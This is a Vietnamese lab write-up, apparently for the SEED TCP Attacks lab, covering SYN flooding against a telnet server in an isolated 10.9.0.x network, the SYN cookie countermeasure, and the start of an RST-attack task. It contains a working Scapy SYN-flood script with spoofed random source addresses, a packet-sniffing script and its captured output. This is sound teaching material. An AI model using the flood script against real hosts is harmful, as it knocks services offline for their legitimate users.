# TCP Attacks
## Task 1.1: Launching the Attack using Python
### Trước khi tấn công
- Máy victim `10.9.0.5`:  

![image](https://user-images.githubusercontent.com/44528004/142659729-0d784920-3119-4e08-8f2a-19c6ea40d299.png)

- Thử telnet từ `10.9.0.6` tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142659815-09c22988-80d6-4707-bfe2-62e4a7837569.png)
> Thành công.


### Tấn công
- Attack script:
```python
#! /bin/python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits


ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
```

- Máy attacker:  

![image](https://user-images.githubusercontent.com/44528004/142659968-e6444920-365d-4697-9fb4-a6564ee4c2ad.png)

- Máy victim nhận được nhiều SYN packet để yêu cầu mở kết nối TCP:  

![image](https://user-images.githubusercontent.com/44528004/142660229-6f2e065a-9ac4-4ab5-93b8-2d4c0637d9a9.png)

- Thử telnet từ `10.9.0.6` tới máy victim nhưng vẫn thành công:  

![image](https://user-images.githubusercontent.com/44528004/142660351-b34b122c-fde1-4d84-b671-1e9545f2ff12.png)

#### Nguyên nhân
- Khi kiểm tra `tcp_max_syn_backlog` của máy victim thì ta thấy là có 256 half-open connection được cho phép lưu vào queue:  

![image](https://user-images.githubusercontent.com/44528004/142660561-988e0de1-60b5-4640-a6de-9aad4ff6da06.png)


- Tuy nhiên số lượng half-open connection được tạo ra khi attack chỉ dao động khoảng 125 connection.  

![image](https://user-images.githubusercontent.com/44528004/142660642-295d02f2-0d6c-421b-b58f-3f3d1f787f93.png)


- Vậy để attack thành công, ta cần giảm `tcp_max_syn_backlog`.  
    - Đợi cho các half-open connection cũ timeout:  
    
    ![image](https://user-images.githubusercontent.com/44528004/142660968-2fdf30bd-e93d-44a6-81e7-d5091516cdc6.png)

    - Giảm `tcp_max_syn_backlog=30` và tắt `tcp_syncookies`:  
    
    ![image](https://user-images.githubusercontent.com/44528004/142665650-d00f9fc7-1f2d-4f40-86c0-9930783e4737.png)




### Kết quả
- Tại máy victim `10.9.0.5`:
  - Rất nhiều kết nối TCP với source IP và source port khác nhau được tạo ra:  
  
  ![image](https://user-images.githubusercontent.com/44528004/142665940-d3dd8afe-d0c9-4602-b5be-78b069f1e445.png)


- Thử telnet vào máy victim thì thấy là trạng thái liên tục `Trying` và không thể kết nối tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142666504-4a42fb27-62da-45c2-82e4-a0336443e132.png)



## Task 1.2: Launching the Attack using C
### Tấn công
- [Attack script](https://github.com/datthinh1801/seed-labs/blob/master/category-network/TCP_Attacks/Labsetup/volumes/synflood.c)  
- Set `tcp_max_syn_backlog` về lại `256`.  

![image](https://user-images.githubusercontent.com/44528004/142666539-268a474a-1a58-4b5c-878b-96215770c7e5.png)

#### Python
- Attacker:  

![image](https://user-images.githubusercontent.com/44528004/142666633-7e394099-13ba-4fc6-80ec-168a19ab9dc8.png)


- Victim:  

![image](https://user-images.githubusercontent.com/44528004/142666687-afe2178d-41d1-4e21-8735-28039665af78.png)

- Thử telnet từ `10.9.0.6` tới victim:  

![image](https://user-images.githubusercontent.com/44528004/142666747-3c76e075-6b45-4b24-a69e-2974f307c1ba.png)
> Thành công

#### C
- Attacker:  

![image](https://user-images.githubusercontent.com/44528004/142667077-af3f0c6a-60a4-48ca-b486-e78592613d3b.png)

- Victim, có nhiều kết nối TCP với sourc IP và source port khác nhau được tạo ra:  

![image](https://user-images.githubusercontent.com/44528004/142667913-05da5d67-f7b0-411b-ab9b-02e591beefd2.png)  

![image](https://user-images.githubusercontent.com/44528004/142659029-6fe50e34-fbf6-4a7c-9095-dfad76bdf8f3.png)

- Telnet từ `10.9.0.6` tới victim:  

![image](https://user-images.githubusercontent.com/44528004/142668526-45d2ebf9-4774-4947-8628-acb65a126123.png)
> Attack thành công!  

#### Kết luận
- Vì C chạy nhanh hơn Python nên khi tấn công SYN Flood, C sẽ hiệu quả hơn. Theo mục **TCP retransmission issue** trong tài liệu hướng dẫn, sau mỗi 5 lần gửi lại gói tin SYN_ACK, nếu không thành công thì máy victim sẽ xóa connection khỏi queue và sẽ có thêm 1 slot trống. Nếu chúng ta attack nhanh thì gói tin attack sẽ lấp lỗ trống này ngay lập tức và các client hợp lệ sẽ không thể telnet đến victim. Ngược lại, nếu ta tấn công không đủ nhanh, client hợp lệ sẽ có thể tạo được connection.  

## Task 1.3: Enable the SYN Cookie Countermeasure
- Mở SYN cookie trên máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142670130-0c9326a7-70c2-47c7-b9bc-1016a042fb0a.png)

### Attack bằng Python
- Attacker:  

![image](https://user-images.githubusercontent.com/44528004/142670199-7fa0c750-bc86-4479-bd8b-7493f2f99cd4.png)


- Victim:  

![image](https://user-images.githubusercontent.com/44528004/142670274-2a15e636-3e54-406b-8171-8e94c6b89596.png)


- Telnet từ `10.9.0.6` tới máy victim:  

![image](https://user-images.githubusercontent.com/44528004/142670344-5617ef36-2d41-4756-9158-c876581edd73.png)
> Telnet thành công. TẤN CÔNG THẤT BẠI.  

### Attack bằng C
- Attacker  

![image](https://user-images.githubusercontent.com/44528004/142670562-dedc7e13-7954-4fb4-a1b0-66439228aee9.png)


- Victim:  

![image](https://user-images.githubusercontent.com/44528004/142670589-fa6f3132-e8d1-4b6f-99d4-b168436d5100.png)


- Telnet tới victim:  

![image](https://user-images.githubusercontent.com/44528004/142670640-168902b7-b54c-45b0-8bc3-76b225915ffc.png)
> Telnet thành công. TẤN CÔNG THẤT BẠI.  

### Kết luận
Tấn công bằng Python và C đều thất bại khi SYN cookie được bật. Do đó, SYN cookie là 1 cơ chế chống TCP SYN flood hiệu quả.

## Task 2: TCP RST Attacks on telnet Connections
### Quan sát
- Sử dụng script sau để quan sát quá trình telnet:  

```python
#! /bin/python3
from scapy.all import *


def attack(packet):
    print(f'{packet[IP].src}:{packet[TCP].sport} > {packet[IP].dst}:{packet[TCP].dport}')
    print(f'\tSeq: {packet[TCP].seq}')
    print(f'\tAck: {packet[TCP].ack}')
    print(f'\tFlags: {packet[TCP].flags}')
    print(f'\tLen: {packet[IP].len}')
    
    
sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack)
```

```sh
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692662
	Ack: 0
	Flags: S
	Len: 60
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676056
	Ack: 3205692663
	Flags: SA
	Len: 60
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692663
	Ack: 552676057
	Flags: A
	Len: 52
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692663
	Ack: 552676057
	Flags: PA
	Len: 76
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676057
	Ack: 3205692687
	Flags: A
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676057
	Ack: 3205692687
	Flags: PA
	Len: 64
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692687
	Ack: 552676069
	Flags: A
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676069
	Ack: 3205692687
	Flags: PA
	Len: 67

# --snip--

10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676693
	Ack: 3205692757
	Flags: PA
	Len: 54
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692757
	Ack: 552676695
	Flags: A
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676695
	Ack: 3205692757
	Flags: FA
	Len: 52
10.9.0.6:41652 > 10.9.0.5:23
	Seq: 3205692757
	Ack: 552676696
	Flags: FA
	Len: 52
10.9.0.5:23 > 10.9.0.6:41652
	Seq: 552676696
	Ack: 3205692758
	Flags: A
	Len: 52
```
